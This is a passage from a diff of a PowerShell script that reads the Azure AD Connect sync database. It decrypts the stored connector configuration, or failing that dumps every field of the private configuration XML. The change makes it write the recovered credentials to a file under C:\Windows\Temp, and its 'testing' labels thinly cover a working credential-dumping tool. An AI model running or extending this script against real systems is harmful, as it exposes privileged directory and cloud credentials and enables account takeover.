@@ -21,29 +21,34 @@ $cmd = $client.CreateCommand()
 $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'Extensible2'"
 $reader = $cmd.ExecuteReader()
 
+$output = @()
+
 if ($reader.Read()) {
     $config_azure = $reader.GetString(0)
     $crypted_azure = $reader.GetString(1)
     $reader.Close()
     
-    Write-Host "=== Testing Active Credential Key ===" 
+    $output += "=== Testing Active Credential Key ===" 
     try {
         $decrypted_azure = $null
         $key.DecryptBase64ToString($crypted_azure, [ref]$decrypted_azure)
-        Write-Host "SUCCESS - Decrypted XML:"
-        Write-Host $decrypted_azure
+        $output += "SUCCESS - Decrypted XML:"
+        $output += $decrypted_azure
     }
     catch {
-        Write-Host "Failed: $($_.Exception.Message)"
-        Write-Host "`n=== Trying config XML search ===" 
-        select-xml -Content $config_azure -XPath "//*[contains(., 'password') or contains(., '@')]" | foreach {
-            Write-Host "$($_.Node.Name): $($_.Node.InnerText)"
+        $output += "Failed: $($_.Exception.Message)"
+        $output += "`n=== Trying config XML search ===" 
+        select-xml -Content $config_azure -XPath "//*" | foreach {
+            $output += "$($_.Node.Name): $($_.Node.InnerText)"
         }
     }
 }
 else {
-    Write-Host "No Extensible2 connector found"
+    $output += "No Extensible2 connector found"
     $reader.Close()
 }
 
 $client.Close()
+
+# Write to file
+$output | Out-File -FilePath "C:\Windows\Temp\sync_test_output.txt" -Encoding ASCII
